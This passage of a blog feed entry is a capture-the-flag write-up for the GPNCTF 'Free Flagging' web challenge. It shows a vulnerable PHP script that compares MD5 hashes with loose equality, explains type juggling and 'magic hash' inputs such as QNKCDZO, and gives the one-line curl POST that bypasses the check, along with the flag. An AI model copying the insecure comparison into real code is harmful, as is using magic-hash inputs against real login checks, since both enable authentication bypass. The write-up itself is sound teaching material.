class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] !== <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line"><span class="variable">$guess</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;You correctly guessed the flag - &quot;</span> . <span class="variable">$flag</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;You guessed wrong: The flags hash is &quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>) . <span class="string">&quot; and the hash of your guess is &quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$guess</span>));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div><hr><h2 id="What-Is-This-Code-Doing"><a href="#What-Is-This-Code-Doing" class="headerlink" title="What Is This Code Doing?"></a>What Is This Code Doing?</h2><ol><li><p>When you visit the page normally (GET request): The server shows the source code of the file, like if you were reading the code behind a webpage.</p></li><li><p>When you send a POST request with a guess: The server compares your guess with the flag using md5() (a type of hash function).</p></li></ol><ul><li>If your guess matches the flag’s hash, it gives you the flag.</li><li>If your guess doesn’t match, it shows you the hash of the flag and your guess.</li></ul><p>Seems secure, right but not really guys…</p><hr><h2 id="The-Bug-–-PHP-Type-Juggling"><a href="#The-Bug-–-PHP-Type-Juggling" class="headerlink" title="The Bug – PHP Type Juggling"></a>The Bug – PHP Type Juggling</h2><blockquote><p>PHP has a weird behavior when comparing values using &#x3D;&#x3D; (double equals). It doesn’t always check if things are exactly the same. If two values look like numbers, PHP might convert them into numbers before comparing them. This is called type juggling.</p></blockquote><hr><h3 id="Why-is-this-dangerous"><a href="#Why-is-this-dangerous" class="headerlink" title="Why is this dangerous?"></a>Why is this dangerous?</h3><p>PHP doesn’t always compare things the way we expect. It might treat strings that look like numbers (even if they’re not) as actual numbers.</p><p>Here’s the scary part:</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;0e1234&quot;</span> == <span class="string">&quot;0e5678&quot;</span></span><br></pre></td></tr></table></figure></div><p>Both 0e1234 and 0e5678 are actually numbers in scientific notation:</p><ul><li>0e1234 means 0 * 10^1234</li><li>0e5678 means 0 * 10^5678</li></ul><p>Both are treated as 0. So PHP thinks they’re the same even though they’re different!</p><hr><h2 id="Magic-Hash-Example"><a href="#Magic-Hash-Example" class="headerlink" title="Magic Hash Example"></a>Magic Hash Example</h2><p>Now let’s talk about magic hashes. MD5 is a type of hash function that turns a string into a fixed-size value. In this challenge, we are comparing two MD5 hashes.</p><p>Consider this string QNKCDZO. When we run it through the MD5 hash function, it gives us:</p><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="string">&quot;QNKCDZO&quot;</span>) = 0e830400451993494058024219903391</span><br></pre></td></tr></table></figure></div><p>Notice how it starts with 0e followed by numbers? That’s a magic hash. It looks like scientific notation (i.e., a number), which is dangerous in PHP because of the way PHP handles type comparison.</p><p>If the real flag’s hash looks like this:</p><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="variable">$flag</span>) = 0e12345678901234567890</span><br></pre></td></tr></table></figure></div><p>Then PHP compares these two like this:</p><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="variable">$flag</span>) == md5(<span class="string">&quot;QNKCDZO&quot;</span>)  → TRUE </span><br></pre></td></tr></table></figure></div><p>PHP thinks both hashes are the same because they both start with 0e. This means the hashes are not the same, but PHP wrongly says they are equal!</p><hr><h2 id="The-Exploit-One-Line-Win"><a href="#The-Exploit-One-Line-Win" class="headerlink" title="The Exploit (One-Line Win)"></a>The Exploit (One-Line Win)</h2><p>I sent the magic hash string (QNKCDZO) to the server using a simple POST request.</p><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST https://stormwood-of-unstoppable-commerce.gpn23.ctf.kitctf.de -d <span class="string">&#x27;QNKCDZO&#x27;</span></span><br></pre></td></tr></table></figure></div><p>The server saw QNKCDZO, hashed it, and then compared the hashes. Because of the magic hash bug, PHP thought my guess was the correct flag and it worked!</p><p>Flag: <code>GPNCTF&#123;just_php_d01ng_php_th1ng5_abM2zz&#125;</code></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/Freeflagging-gpn.png"                      alt="Free-Flagging"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Free-Flagging&quot;&gt;&lt;a href=&quot;#Free-Flagging&quot; class=&quot;headerlink&quot; title=&quot;Free Flagging&quot;&gt;&lt;/a&gt;Free Flagging&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;A small PHP c</summary>
      
    
    
    
    <category term="Web" scheme="https://blog.aawart.com.np/categories/Web/"/>
    
    
    <category term="Web" scheme="https://blog.aawart.com.np/tags/Web/"/>
    
    <category term="PHP" scheme="https://blog.aawart.com.np/tags/PHP/"/>
    
    <category term="GPNCTF" scheme="https://blog.aawart.com.np/tags/GPNCTF/"/>
    
  </entry>
  
</feed>
